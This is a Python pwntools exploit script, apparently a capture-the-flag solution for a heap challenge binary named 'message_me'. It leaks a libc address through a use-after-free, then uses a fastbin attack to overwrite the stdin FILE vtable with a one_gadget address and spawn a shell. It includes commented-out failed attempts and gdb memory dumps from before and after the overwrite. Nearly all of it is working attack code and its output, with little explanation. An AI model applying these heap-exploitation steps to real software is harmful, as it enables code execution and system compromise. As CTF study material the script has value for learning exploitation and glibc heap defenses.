#! /usr/bin/python

from pwn import *

s = process('./message_me')

def print_menu():
    for _ in range(7):
        s.recvline()
    s.recvuntil('choice : ')

# 16 < size < 4095
def add(size, content):
    s.sendline('0')
    s.sendlineafter('size : ', str(size))
    s.sendlineafter('meesage : ', content)
    print 'add', s.recvline()
    print_menu()

def remove(index):
    s.sendline('1')
    s.sendlineafter('message : ', str(index))
    print 'remove', s.recvline()
    print_menu()

def show(index):
    s.sendline('2')
    s.sendlineafter('message : ', str(index))
    s.recvline()
    result = s.recvline()
    print_menu()
    return result

def change(index):
    s.sendline('3')
    s.sendlineafter('message : ', str(index))
    print 'change ts', s.recvline()
    print_menu()

# === UAF after remove  => leak
print_menu()
add(0x100, 'A' * 0x99)
add(0x20, 'B' * 0x19)
show(0)
remove(0)
leak = show(0)[-7:-1:] + '\x00\x00'

leak = u64(leak)
#print 'leak =', hex(leak) # 0x7ffff7dd1b78
#0x7ffff7dd1b78 - 0x7ffff7a0d000 = 0x3c4b78
libc_addr = leak - 0x3c4b78
log.info('libc_addr = ' + hex(libc_addr))

#__malloc_hook(0x3c4b10) 
#__malloc_hook_addr = libc_addr + 0x3c4b10
#log.info('__malloc_hook_addr = ' + hex(__malloc_hook_addr))
#hook = __malloc_hook_addr - 0x23
one_gadget_addr = libc_addr + 0xf02a4
#one_gadget_addr2 = libc_addr + 0x4526a # 0xf1147 0x45216
#log.info('one_gadget_addr2 = ' + hex(one_gadget_addr2))
log.info('one_gadget_addr = ' + hex(one_gadget_addr))   # 0x7ffff7afd2a4

#realloc_addr = libc_addr + 0x846c0
#log.info('hook = ' + hex(hook)) # 0x7ffff7dd1aed did not work writing one_gadget into malloc (was no 0 at requited places)


# we have scanf calls so we gone exploit like this:
_IO_2_1_stdin_addr = libc_addr + 0x3c48e0
_IO_2_1_stdout_addr = libc_addr + 0x3c5620
_IO_2_1_stderr_addr = libc_addr + 0x3c5540

log.info('_IO_2_1_stdin_addr = ' + hex(_IO_2_1_stdin_addr))    #0x7ffff7dd18e0
log.info('_IO_2_1_stdout_addr = ' + hex(_IO_2_1_stdout_addr))
log.info('_IO_2_1_stderr_addr = ' + hex(_IO_2_1_stderr_addr))

_wide_data_addr = _IO_2_1_stdin_addr + 157                  
log.info('_wide_data_addr = ' + hex(_wide_data_addr))          #0x7ffff7dd197d
vtable_addr = _IO_2_1_stdin_addr + 208
log.info('vtable_addr = ' + hex(vtable_addr))                  #0x7ffff7dd19b0
# === fastbin attack


add(0x60,p64(0x71)+p64(_wide_data_addr))
#add(0x60,p64(0x71)+p64(_IO_2_1_stdout_addr + 157))
add(0x60, 'C' * 0x59)

remove(2)
remove(3)

change(3)
change(3)
change(3)

add(0x60, 'D' * 0x59)
add(0x60, 'E' * 0x59)


payload = '\x00' * 11
payload += p64(0xffffffff) + p64(0) * 2
payload += p64(vtable_addr)
payload += p64(one_gadget_addr) * 6

#Does not work because of puts("Done") in add function
#payload = '\x00' * 0x23 + p64(_IO_2_1_stdout_addr + 192) 
#payload += p64(_IO_2_1_stderr_addr) + p64(_IO_2_1_stdout_addr) + p64(_IO_2_1_stdin_addr)
#payload += p64(oneshot) * 3

'''
gdb.attach(s, """
b * main
b * menu
b * delete
b * show
b * change_time_stamp
b * add
""")
'''

add(0x60, payload)

s.interactive()

'''
before:
gdb-peda$ x/64gx 0x7ffff7dd18e0
0x7ffff7dd18e0 <_IO_2_1_stdin_>:	0x00000000fbad208b	0x00007ffff7dd1963
0x7ffff7dd18f0 <_IO_2_1_stdin_+16>:	0x00007ffff7dd1963	0x00007ffff7dd1963
0x7ffff7dd1900 <_IO_2_1_stdin_+32>:	0x00007ffff7dd1963	0x00007ffff7dd1963
0x7ffff7dd1910 <_IO_2_1_stdin_+48>:	0x00007ffff7dd1963	0x00007ffff7dd1963
0x7ffff7dd1920 <_IO_2_1_stdin_+64>:	0x00007ffff7dd1964	0x0000000000000000
0x7ffff7dd1930 <_IO_2_1_stdin_+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1940 <_IO_2_1_stdin_+96>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1950 <_IO_2_1_stdin_+112>:	0x0000001000000000	0xffffffffffffffff
0x7ffff7dd1960 <_IO_2_1_stdin_+128>:	0x000000000a000000	0x00007ffff7dd3790
0x7ffff7dd1970 <_IO_2_1_stdin_+144>:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dd1980 <_IO_2_1_stdin_+160>:	0x00007ffff7dd19c0	0x0000000000000000 <- <- _wide_data
0x7ffff7dd1990 <_IO_2_1_stdin_+176>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd19a0 <_IO_2_1_stdin_+192>:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dd19b0 <_IO_2_1_stdin_+208>:	0x0000000000000000	0x00007ffff7dd06e0 <- vtable
0x7ffff7dd19c0 <_IO_wide_data_0>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd19d0 <_IO_wide_data_0+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd19e0 <_IO_wide_data_0+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd19f0 <_IO_wide_data_0+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1a00 <_IO_wide_data_0+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1a10 <_IO_wide_data_0+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1a20 <_IO_wide_data_0+96>:	0x0000000000000000	0x0000000000000000


after:
gdb-peda$ x/64gx 0x7ffff7dd18e0
0x7ffff7dd18e0 <_IO_2_1_stdin_>:	0x00000000fbad208b	0x00007ffff7dd1963
0x7ffff7dd18f0 <_IO_2_1_stdin_+16>:	0x00007ffff7dd1964	0x00007ffff7dd1963
0x7ffff7dd1900 <_IO_2_1_stdin_+32>:	0x00007ffff7dd1963	0x00007ffff7dd1963
0x7ffff7dd1910 <_IO_2_1_stdin_+48>:	0x00007ffff7dd1963	0x00007ffff7dd1963
0x7ffff7dd1920 <_IO_2_1_stdin_+64>:	0x00007ffff7dd1964	0x0000000000000000
0x7ffff7dd1930 <_IO_2_1_stdin_+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1940 <_IO_2_1_stdin_+96>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1950 <_IO_2_1_stdin_+112>:	0x0000000000000000	0xffffffffffffffff
0x7ffff7dd1960 <_IO_2_1_stdin_+128>:	0x000000000a000000	0x00007ffff7dd3790
0x7ffff7dd1970 <_IO_2_1_stdin_+144>:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dd1980 <_IO_2_1_stdin_+160>:	0x00007ffff7dd19c0	0x0e80910000000000 <- <- _wide_data
0x7ffff7dd1990 <_IO_2_1_stdin_+176>:	0x000000000000005b	0x0000000000000000
0x7ffff7dd19a0 <_IO_2_1_stdin_+192>:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dd19b0 <_IO_2_1_stdin_+208>:	0x0000000000000000	0x00007ffff7dd19b0 <- vtable
0x7ffff7dd19c0 <_IO_wide_data_0>:	0x00007ffff7afd2a4	0x00007ffff7afd2a4
0x7ffff7dd19d0 <_IO_wide_data_0+16>:	0x00007ffff7afd2a4	0x00007ffff7afd2a4
0x7ffff7dd19e0 <_IO_wide_data_0+32>:	0x00007ffff7afd2a4	0x00007ffff7afd2a4
0x7ffff7dd19f0 <_IO_wide_data_0+48>:	0x00000000f7afd2a4	0x0000000000000000
0x7ffff7dd1a00 <_IO_wide_data_0+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1a10 <_IO_wide_data_0+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1a20 <_IO_wide_data_0+96>:	0x0000000000000000	0x0000000000000000

gdb-peda$ p _IO_2_1_stdin_
$1 = {
  file = {
    _flags = 0xfbad208b, 
    _IO_read_ptr = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "", 
    _IO_read_end = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "", 
    _IO_read_base = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "", 
    _IO_write_base = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "", 
    _IO_write_ptr = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "", 
    _IO_write_end = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "", 
    _IO_buf_base = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "", 
    _IO_buf_end = 0x7ffff7dd1964 <_IO_2_1_stdin_+132> "", 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x0, 
    _fileno = 0x0, 
    _flags2 = 0x0, 
    _old_offset = 0xffffffffffffffff, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = "", 
    _lock = 0x7ffff7dd3790 <_IO_stdfile_0_lock>, 
    _offset = 0xffffffffffffffff, 
    _codecvt = 0x0, 
    _wide_data = 0x7ffff7dd19c0 <_IO_wide_data_0>, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0x0, 
    _unused2 = '\000' <repeats 19 times>
  }, 
---Type <return> to continue, or q <return> to quit---
  vtable = 0x7ffff7dd06e0 <_IO_file_jumps>
}
'''

















